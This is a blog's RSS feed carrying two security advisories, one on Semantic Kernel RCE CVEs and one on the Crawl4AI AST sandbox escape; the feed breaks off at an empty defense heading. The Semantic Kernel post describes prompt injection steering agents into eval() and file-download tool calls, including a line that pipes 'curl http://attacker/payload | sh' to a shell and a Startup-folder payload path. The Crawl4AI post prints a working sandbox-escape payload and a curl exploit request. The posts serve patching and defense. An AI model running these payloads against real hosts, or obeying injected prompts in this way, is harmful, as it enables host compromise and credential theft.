@@ -1,0 +1,292 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>RCE on RockB</title><link>https://baeseokjae.github.io/tags/rce/</link><description>Recent content in RCE on RockB</description><image><title>RockB</title><url>https://baeseokjae.github.io/images/og-default.png</url><link>https://baeseokjae.github.io/images/og-default.png</link></image><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 07 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://baeseokjae.github.io/tags/rce/index.xml" rel="self" type="application/rss+xml"/><item><title>Semantic Kernel Agent RCE Vulnerabilities Guide 2026: When Prompt Injection Becomes Code Execution</title><link>https://baeseokjae.github.io/posts/semantic-kernel-agent-rce-vulnerabilities-guide-2026/</link><pubDate>Tue, 07 Jul 2026 00:00:00 +0000</pubDate><guid>https://baeseokjae.github.io/posts/semantic-kernel-agent-rce-vulnerabilities-guide-2026/</guid><description>A technical breakdown of CVE-2026-26030 and CVE-2026-25592 — two critical RCE vulnerabilities in Microsoft&amp;#39;s Semantic Kernel that turned prompt injection into host compromise. Includes exploit mechanics, mitigation steps, and lessons for every agent framework.</description><content:encoded><![CDATA[<p>If you&rsquo;re building AI agents with Microsoft&rsquo;s Semantic Kernel, stop and check your version right now. Two critical vulnerabilities — CVE-2026-26030 (CVSS 9.9) and CVE-2026-25592 (CVSS 9.9) — turn prompt injection from a content-quality annoyance into a full host compromise primitive. I&rsquo;ve spent the last few weeks digging into both exploits, and the implications go far beyond Semantic Kernel itself.</p>
+<p>Here&rsquo;s the uncomfortable truth: <strong>AI models are not security boundaries</strong>. Every parameter an LLM can influence when calling a tool is attacker-controlled input. If your framework passes that input to <code>eval()</code>, a file write function, or a shell command without validation, you&rsquo;ve built a remote code execution vector that only needs a cleverly crafted prompt to trigger.</p>
+<h2 id="the-two-vulnerabilities-at-a-glance">The Two Vulnerabilities at a Glance</h2>
+<table>
+  <thead>
+      <tr>
+          <th>CVE</th>
+          <th>Component</th>
+          <th>CVSS</th>
+          <th>Attack Vector</th>
+          <th>Patched In</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CVE-2026-26030</td>
+          <td>Python SDK <code>InMemoryVectorStore</code></td>
+          <td>9.9 (Critical)</td>
+          <td>Prompt injection → search filter → <code>eval()</code> → RCE</td>
+          <td><code>python-1.39.4</code></td>
+      </tr>
+      <tr>
+          <td>CVE-2026-25592</td>
+          <td>.NET SDK <code>SessionsPythonPlugin</code></td>
+          <td>9.9 (Critical)</td>
+          <td>Prompt injection → <code>DownloadFileAsync</code> → arbitrary file write → RCE</td>
+          <td><code>1.71.0</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>Both were disclosed in early 2026. Both earned a 9.9 CVSS because they require no special privileges, no user interaction beyond the initial prompt, and the impact is total host compromise.</p>
+<h2 id="cve-2026-26030-the-python-eval-sink">CVE-2026-26030: The Python eval() Sink</h2>
+<p>This one is the more technically interesting of the two. Semantic Kernel&rsquo;s <code>InMemoryVectorStore</code> — a vector store used for in-memory semantic search — accepts a <code>filter</code> parameter that gets converted into a Python lambda expression and passed to <code>eval()</code>.</p>
+<p>Here&rsquo;s the chain:</p>
+<ol>
+<li>An attacker crafts a prompt that tells the agent to search the vector store with a malicious filter string</li>
+<li>The filter string is interpolated into a lambda: <code>lambda x: {filter_string}</code></li>
+<li>That lambda string is passed to Python&rsquo;s built-in <code>eval()</code></li>
+<li>The original code had an AST blocklist — it tried to block dangerous operations by checking the parsed AST for forbidden node types</li>
+<li>The bypass: traverse Python&rsquo;s class hierarchy via <code>BuiltinImporter</code> → <code>load_module</code> → <code>os.system</code></li>
+</ol>
+<p>The AST blocklist approach is the classic security mistake in dynamic languages. Python&rsquo;s object model is too rich to blocklist effectively. The fix in <code>python-1.39.4</code> replaces it with an allowlist approach: only specific AST node types are permitted, function calls are restricted to an explicit allowlist, and dangerous attribute access is blocked at the AST level rather than at runtime.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Vulnerable pattern (simplified)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_build_lambda</span>(filter_string: str):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># AST blocklist — fragile by design</span>
+</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>parse(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;lambda x: </span><span style="color:#e6db74">{</span>filter_string<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> node <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(tree):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> type(node) <span style="color:#f92672">in</span> BLOCKLIST:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Forbidden construct&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eval(compile(tree, <span style="color:#e6db74">&#34;&lt;string&gt;&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bypass: BuiltinImporter.load_module(&#34;os&#34;).system(&#34;curl http://attacker/payload | sh&#34;)</span>
+</span></span></code></pre></div><p>The bypass works because <code>BuiltinImporter</code> is a built-in class that can load arbitrary modules. The AST blocklist didn&rsquo;t account for class hierarchy traversal — you don&rsquo;t need <code>import</code> or <code>__import__</code> when you can walk up the type hierarchy of any accessible object to find <code>BuiltinImporter</code>, call <code>load_module(&quot;os&quot;)</code>, and then call <code>system()</code>.</p>
+<p><strong>If you&rsquo;re using <code>InMemoryVectorStore</code> in production, stop.</strong> It was never designed for untrusted input. The patched version is safer, but the fundamental design — building executable code from string interpolation — is something I&rsquo;d avoid entirely for any store that processes AI-generated content.</p>
+<h2 id="cve-2026-25592-the-accidental-kernelfunction">CVE-2026-25592: The Accidental KernelFunction</h2>
+<p>This one is almost comical in its simplicity. Semantic Kernel&rsquo;s .NET <code>SessionsPythonPlugin</code> has a <code>DownloadFileAsync</code> method that downloads a file from a URL to a local path. Someone marked it with <code>[KernelFunction]</code> — the attribute that exposes a method as an AI-callable tool.</p>
+<p>That&rsquo;s it. No authentication check. No path validation. No confirmation dialog. An AI agent can call <code>DownloadFileAsync</code> with any URL and any local file path, and the framework happily writes the file.</p>
+<p>The attack scenario on Windows is straightforward:</p>
+<ol>
+<li>Prompt injection tells the agent to download a malicious executable</li>
+<li>The agent calls <code>DownloadFileAsync(&quot;http://attacker/payload.exe&quot;, &quot;C:\\Users\\Victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe&quot;)</code></li>
+<li>Next time the user signs in, the payload executes</li>
+</ol>
+<p>The fix in <code>1.71.0</code> does two things: removes the <code>[KernelFunction]</code> attribute from <code>DownloadFileAsync</code>, and adds <code>ValidateLocalPathForDownload()</code> that checks the destination path against an allowlist of permitted directories.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">// Before (vulnerable)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[KernelFunction]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">async</span> Task DownloadFileAsync(<span style="color:#66d9ef">string</span> url, <span style="color:#66d9ef">string</span> localFilePath)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">using</span> var client = <span style="color:#66d9ef">new</span> HttpClient();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> data = <span style="color:#66d9ef">await</span> client.GetByteArrayAsync(url);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> File.WriteAllBytesAsync(localFilePath, data);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// After (patched in 1.71.0)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [KernelFunction] removed entirely</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Path validation added</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">string</span> ValidateLocalPathForDownload(<span style="color:#66d9ef">string</span> path)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Only allow paths under a configured safe directory</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The lesson here applies to every framework: <strong>every public method annotated as a tool is a potential attack surface</strong>. Before you add <code>[KernelFunction]</code>, <code>@tool</code>, or <code>@agent_function</code> to a method, ask yourself: &ldquo;What happens if an attacker controls every parameter of this method?&rdquo;</p>
+<h2 id="why-these-matter-beyond-semantic-kernel">Why These Matter Beyond Semantic Kernel</h2>
+<p>Semantic Kernel has 27,000+ GitHub stars and is embedded in Microsoft 365 Copilot, Azure Container Apps dynamic sessions, and countless enterprise RAG applications. But the vulnerability class isn&rsquo;t unique to Microsoft&rsquo;s framework.</p>
+<p>LangChain had similar issues with <code>eval()</code> in its early Python REPL tool. CrewAI&rsquo;s tool system passes model-generated parameters directly to function calls. AutoGen&rsquo;s code execution sandbox has been <a href="https://baeseokjae.github.io/posts/semantic-kernel-autogen-migration-agent-framework-2026/">bypassed multiple times</a>. Every agent framework that wires LLM outputs to tool calls without parameter validation has the same fundamental problem.</p>
+<p>The pattern is always the same:</p>
+<ol>
+<li>Framework exposes a tool that takes a string parameter</li>
+<li>The LLM generates the parameter value based on user + system prompt</li>
+<li>Prompt injection contaminates the parameter</li>
+<li>The framework passes the contaminated parameter to a sensitive sink (<code>eval()</code>, file write, shell command)</li>
+<li>Host compromise</li>
+</ol>
+<p>I covered <a href="https://baeseokjae.github.io/posts/clean-repo-prompt-injection-defense-guide-2026/">prompt injection defense patterns</a> in a previous post, but these CVEs raise the stakes. Prompt injection isn&rsquo;t just about leaking context or generating offensive content anymore — it&rsquo;s a code execution primitive.</p>
+<h2 id="mitigation-checklist">Mitigation Checklist</h2>
+<p>If you&rsquo;re running Semantic Kernel today, here&rsquo;s your action plan:</p>
+<p><strong>Immediate (today):</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> Upgrade Python SDK to <code>&gt;=1.39.4</code></li>
+<li><input disabled="" type="checkbox"> Upgrade .NET SDK to <code>&gt;=1.71.0</code></li>
+<li><input disabled="" type="checkbox"> Audit all <code>[KernelFunction]</code> / <code>@kernel_function</code> annotations in your codebase</li>
+<li><input disabled="" type="checkbox"> Check for any <code>eval()</code>, <code>exec()</code>, or <code>compile()</code> calls in your plugin code</li>
+</ul>
+<p><strong>Short-term (this week):</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> Implement Function Invocation Filters for all file I/O operations</li>
+<li><input disabled="" type="checkbox"> Add runtime monitoring for suspicious child processes (cmd.exe, powershell, python -c) spawned by agent host processes</li>
+<li><input disabled="" type="checkbox"> Review your vector store choice — <code>InMemoryVectorStore</code> should not be in production pipelines</li>
+<li><input disabled="" type="checkbox"> Set up Microsoft Defender advanced hunting queries for post-exploitation indicators (the Microsoft Security Blog post from May 7 has specific KQL queries)</li>
+</ul>
+<p><strong>Ongoing:</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> Treat all AI-influenced parameters as untrusted input — validate, sanitize, and allowlist</li>
+<li><input disabled="" type="checkbox"> Prefer allowlist-based validation over blocklist-based for every security check</li>
+<li><input disabled="" type="checkbox"> Run <a href="https://baeseokjae.github.io/posts/ai-agent-security-tools-2026/">agent security tooling</a> in your CI pipeline to catch exposed tool surfaces</li>
+<li><input disabled="" type="checkbox"> Monitor the <a href="https://baeseokjae.github.io/posts/agent-skills-supply-chain-security-guide-2026/">agent supply chain</a> — third-party plugins and skills are common sources of accidentally exposed functions</li>
+</ul>
+<h2 id="the-bigger-picture">The Bigger Picture</h2>
+<p>What makes these CVEs a watershed moment is that they close the loop on a threat model that the industry has been hand-waving about for two years. We&rsquo;ve known prompt injection was theoretically dangerous. Now we have concrete proof that it can lead to RCE in the most widely-used enterprise agent framework.</p>
+<p>The Microsoft Security Blog post from May titled &ldquo;When prompts become shells&rdquo; isn&rsquo;t hyperbole — it&rsquo;s an accurate description of the new reality. Every agent framework needs to treat the tool boundary as a trust boundary, with the same rigor we apply to API endpoints exposed to the internet.</p>
+<p>The frameworks that survive this shift will be the ones that build security into the tool abstraction layer itself — not as an afterthought, but as a first-class concern. Parameter validation, capability-based access control, and explicit allowlists for sensitive operations need to be framework features, not something every developer has to implement from scratch.</p>
+<p>For now, patch your Semantic Kernel instances, audit your tool annotations, and start treating every parameter the LLM touches as potentially malicious. The era of &ldquo;prompt injection is just a content issue&rdquo; is over.</p>
+]]></content:encoded></item><item><title>Crawl4AI Critical RCE Sandbox Escape Guide 2026: CVE-2026-53753 (CVSS 9.8)</title><link>https://baeseokjae.github.io/posts/crawl4ai-rce-sandbox-escape-guide-2026/</link><pubDate>Mon, 06 Jul 2026 12:00:00 +0000</pubDate><guid>https://baeseokjae.github.io/posts/crawl4ai-rce-sandbox-escape-guide-2026/</guid><description>A practical 2026 guide to understanding, detecting, and fixing the Crawl4AI CVE-2026-53753 pre-auth RCE via AST sandbox escape — including the exploit chain, upgrade steps, and defense-in-depth.</description><content:encoded><![CDATA[<p>On June 16, 2026, the Crawl4AI project released version 0.8.7 with a fix for CVE-2026-53753 — a pre-authentication remote code execution vulnerability with a CVSS score of 9.8. The exploit requires a single HTTP POST request to the <code>/crawl</code> endpoint, no authentication, and it works against the default Docker image. If you run Crawl4AI in any production or development capacity, this is the most important security update of 2026 for your AI pipeline.</p>
+<p>I&rsquo;ve spent the last week digging into the exploit chain, the patch diff, and the defense-in-depth measures that actually protect your instances. Here&rsquo;s everything you need to know, from the technical details of the AST sandbox escape to the exact commands for upgrading and verifying the fix.</p>
+<h2 id="what-is-cve-2026-53753--overview-of-the-critical-rce-in-crawl4ai">What Is CVE-2026-53753? — Overview of the Critical RCE in Crawl4AI</h2>
+<p>CVE-2026-53753 is an unauthenticated remote code execution vulnerability in Crawl4AI versions 0.8.6 and earlier. The vulnerability lives in the <code>_safe_eval_expression()</code> function, which evaluates user-supplied computed field expressions using Python&rsquo;s <code>eval()</code> behind an AST-based sandbox. Three independent researchers — Song Binglin (q1uf3ng), by111 (August829), and jannahopp — discovered that the AST sandbox can be bypassed using Python&rsquo;s frame introspection chain, giving an attacker full shell access to the host.</p>
+<p>The CVSS vector tells the story: <strong>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</strong>. Network-based, low complexity, no privileges required, no user interaction, and full compromise of confidentiality, integrity, and availability. The EPSS score sits at 0.371% (59th percentile) as of late June 2026, which means exploitation is moderately probable — not a theoretical risk, not a guaranteed worm, but well within the range where active scanning should be expected.</p>
+<p>Two related vulnerabilities were published alongside it: CVE-2026-53754 (CVSS 7.5, SSRF) and CVE-2026-53755 (CVSS 8.6, SSRF via <code>proxy_config</code>). I&rsquo;ll cover those at the end, but the RCE is the one you need to patch today.</p>
+<h2 id="who-is-affected--affected-versions-and-default-configurations">Who Is Affected? — Affected Versions and Default Configurations</h2>
+<p>Every Crawl4AI deployment running version 0.8.6 or earlier is vulnerable. The default Docker image <code>unclecode/crawl4ai:0.8.6</code> exposes port 11235 with JWT authentication <strong>disabled by default</strong>. That means any attacker who can reach that port — whether it&rsquo;s exposed to the internet, sitting on an internal network, or accessible from a compromised container — can send a single POST request and execute arbitrary commands.</p>
+<p>If you deployed Crawl4AI as part of an AI pipeline, a research automation stack, or a document processing workflow, check your version right now. The default configuration has no authentication layer, no rate limiting on the <code>/crawl</code> endpoint, and no input validation on computed field expressions. It was designed for convenience, and that convenience is the vulnerability.</p>
+<h2 id="how-the-ast-sandbox-escape-works-technical-deep-dive">How the AST Sandbox Escape Works (Technical Deep Dive)</h2>
+<p>The exploit chain is elegant in the worst possible way. It exploits a fundamental limitation of AST-based sandboxing: the AST validator only checks the <em>structure</em> of the code, not the runtime behavior of the objects it can reach.</p>
+<h3 id="the-flawed-_safe_eval_expression-function">The Flawed <code>_safe_eval_expression()</code> Function</h3>
+<p>In Crawl4AI 0.8.6, computed fields are evaluated through a function that looks roughly like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_safe_eval_expression</span>(expression: str, context: dict) <span style="color:#f92672">-&gt;</span> Any:
+</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>parse(expression, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> node <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(tree):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(node, ast<span style="color:#f92672">.</span>Attribute):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> node<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;_&#39;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Access to private attributes is blocked&#34;</span>)
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> compile(tree, <span style="color:#e6db74">&#39;&lt;safe_eval&gt;&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eval(code, {<span style="color:#e6db74">&#34;__builtins__&#34;</span>: {}}, context)
+</span></span></code></pre></div><p>The intent is clear: block access to underscore-prefixed attributes (like <code>__class__</code>, <code>__subclasses__</code>, <code>__builtins__</code>) and pass an empty <code>__builtins__</code> dict to <code>eval()</code>. This is a common pattern in Python sandboxing, and it fails for the same reason every similar attempt fails: Python&rsquo;s object model is too interconnected to sandbox by attribute name alone.</p>
+<h3 id="the-exploit-chain-generator--frame-walk--builtins">The Exploit Chain: Generator → Frame Walk → Builtins</h3>
+<p>The PoC published by BiiTts demonstrates the bypass in four steps:</p>
+<p><strong>Step 1: Create a generator expression.</strong> Generator objects in Python have a <code>gi_frame</code> attribute that points to the current execution frame. The AST validator doesn&rsquo;t block <code>gi_frame</code> because it doesn&rsquo;t start with an underscore.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># This passes the AST validator — no underscore-prefixed attributes</span>
+</span></span><span style="display:flex;"><span>gen <span style="color:#f92672">=</span> (x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>frame <span style="color:#f92672">=</span> gen<span style="color:#f92672">.</span>gi_frame
+</span></span></code></pre></div><p><strong>Step 2: Walk the frame chain.</strong> Each frame has a <code>f_back</code> attribute pointing to the caller&rsquo;s frame. By walking up the frame chain, you can reach frames that have access to the full Python environment — including the real <code>__builtins__</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Walk up the frame chain to reach the module-level frame</span>
+</span></span><span style="display:flex;"><span>caller_frame <span style="color:#f92672">=</span> frame<span style="color:#f92672">.</span>f_back  <span style="color:#75715e"># frame that called _safe_eval_expression</span>
+</span></span><span style="display:flex;"><span>module_frame <span style="color:#f92672">=</span> caller_frame<span style="color:#f92672">.</span>f_back  <span style="color:#75715e"># module-level frame</span>
+</span></span></code></pre></div><p><strong>Step 3: Access <code>f_builtins</code>.</strong> Frames have a <code>f_builtins</code> attribute that contains the actual builtins dictionary — not the empty one passed to <code>eval()</code>. The AST validator doesn&rsquo;t block <code>f_builtins</code> because it doesn&rsquo;t start with an underscore.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>builtins <span style="color:#f92672">=</span> module_frame<span style="color:#f92672">.</span>f_builtins
+</span></span></code></pre></div><p><strong>Step 4: Import <code>os</code> and execute commands.</strong> With access to the real <code>__builtins__</code>, you can call <code>__import__('os')</code> and use <code>os.popen()</code> to execute arbitrary shell commands.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>os_module <span style="color:#f92672">=</span> builtins[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> os_module<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span></code></pre></div><p>The full payload fits in a single expression that passes the AST validator:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(x<span style="color:#f92672">:=</span> (y <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> [<span style="color:#ae81ff">1</span>]), x<span style="color:#f92672">.</span>__next__(), x<span style="color:#f92672">.</span>gi_frame<span style="color:#f92672">.</span>f_back<span style="color:#f92672">.</span>f_back<span style="color:#f92672">.</span>f_builtins[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read())[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span></code></pre></div><h3 id="why-the-ast-validator-failed-to-block-the-attack">Why the AST Validator Failed to Block the Attack</h3>
+<p>The root cause is that the validator only checks attribute names, not attribute <em>access paths</em>. <code>gi_frame</code>, <code>f_back</code>, and <code>f_builtins</code> are all public attributes — none of them start with an underscore. But together they form a chain that reaches the real builtins, which the sandbox explicitly tried to hide.</p>
+<p>This is the same class of vulnerability that has broken Python sandboxes for over a decade. Ned Batchelder&rsquo;s 2013 article &ldquo;Eval really is dangerous&rdquo; covers the same pattern. The <code>restrictedPython</code> library from Zope has been fighting this battle since Python 2. The lesson is consistent: <strong>you cannot safely <code>eval()</code> untrusted Python code, no matter how clever your AST validator is.</strong></p>
+<p>The 0.8.7 fix removes <code>eval()</code> from the computed fields path entirely. That&rsquo;s the only correct fix.</p>
+<h2 id="real-world-impact--what-an-attacker-can-do">Real-World Impact — What an Attacker Can Do</h2>
+<p>With a successful RCE against a Crawl4AI instance, an attacker can:</p>
+<ul>
+<li><strong>Exfiltrate environment variables</strong> — including API keys for OpenAI, Anthropic, or any LLM provider configured in the Crawl4AI environment</li>
+<li><strong>Access the host filesystem</strong> — read any file the container can read, including mounted secrets and configuration files</li>
+<li><strong>Pivot to internal networks</strong> — the compromised container becomes a beachhead for lateral movement</li>
+<li><strong>Install persistent backdoors</strong> — modify the Crawl4AI image or add cron jobs for long-term access</li>
+<li><strong>Poison the crawl cache</strong> — serve modified content to downstream consumers, which is especially dangerous if Crawl4AI feeds data into an LLM pipeline or training dataset</li>
+</ul>
+<p>The AI pipeline context makes this worse than a typical container RCE. Crawl4AI is commonly deployed as part of research automation, RAG pipelines, and training data collection. A compromised Crawl4AI instance can silently poison the data flowing into your models. I covered the broader risks of AI pipeline supply chain attacks in my <a href="/posts/agent-skills-supply-chain-security-guide-2026/">Agent Skills Supply Chain Security Guide 2026</a>, and the same principles apply here: any component that processes untrusted data is a potential injection point.</p>
+<h2 id="how-to-fix-upgrade-to-crawl4ai-087">How to Fix: Upgrade to Crawl4AI 0.8.7</h2>
+<p>The fix is straightforward: upgrade to version 0.8.7 or later. The 0.8.7 release removes <code>eval()</code> from the computed fields evaluation path entirely and additionally hardens the hook manager sandbox.</p>
+<h3 id="step-by-step-upgrade-instructions">Step-by-Step Upgrade Instructions</h3>
+<p><strong>If you&rsquo;re using Docker:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Pull the latest image</span>
+</span></span><span style="display:flex;"><span>docker pull unclecode/crawl4ai:0.8.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stop and remove the old container</span>
+</span></span><span style="display:flex;"><span>docker stop crawl4ai
+</span></span><span style="display:flex;"><span>docker rm crawl4ai
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the new container</span>
+</span></span><span style="display:flex;"><span>docker run -d <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --name crawl4ai <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p 11235:11235 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -e CRAWL4AI_JWT_SECRET<span style="color:#f92672">=</span>your-strong-secret-here <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  unclecode/crawl4ai:0.8.7
+</span></span></code></pre></div><p><strong>If you installed via pip:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install --upgrade crawl4ai<span style="color:#f92672">==</span>0.8.7
+</span></span></code></pre></div><p><strong>If you&rsquo;re using a custom Dockerfile or Kubernetes deployment:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> unclecode/crawl4ai:0.8.7</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Your custom configuration</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Then update your Kubernetes manifest to reference <code>unclecode/crawl4ai:0.8.7</code> and roll out the change.</p>
+<h3 id="verifying-the-fix">Verifying the Fix</h3>
+<p>After upgrading, verify that the computed fields sandbox no longer accepts frame-walk payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># This should fail with a 400 or 500 error in 0.8.7</span>
+</span></span><span style="display:flex;"><span>curl -X POST http://localhost:11235/crawl <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;urls&#34;: &#34;https://example.com&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;computed_fields&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;test&#34;: &#34;(x:= (y for y in [1]), x.__next__(), x.gi_frame.f_back.f_back.f_builtins[&#39;</span>__import__<span style="color:#e6db74">&#39;](&#39;</span>os<span style="color:#e6db74">&#39;).popen(&#39;</span>id<span style="color:#e6db74">&#39;).read())[-1]&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span>
+</span></span></code></pre></div><p>In 0.8.6, this returns the output of <code>id</code>. In 0.8.7, it should return an error. You can also check the version directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check the running container version</span>
+</span></span><span style="display:flex;"><span>docker exec crawl4ai python -c <span style="color:#e6db74">&#34;import crawl4ai; print(crawl4ai.__version__)&#34;</span>
+</span></span></code></pre></div><p>Expected output: <code>0.8.7</code> or later.</p>
+<h2 id="defense-in-depth-additional-security-measures">Defense-in-Depth: Additional Security Measures</h2>
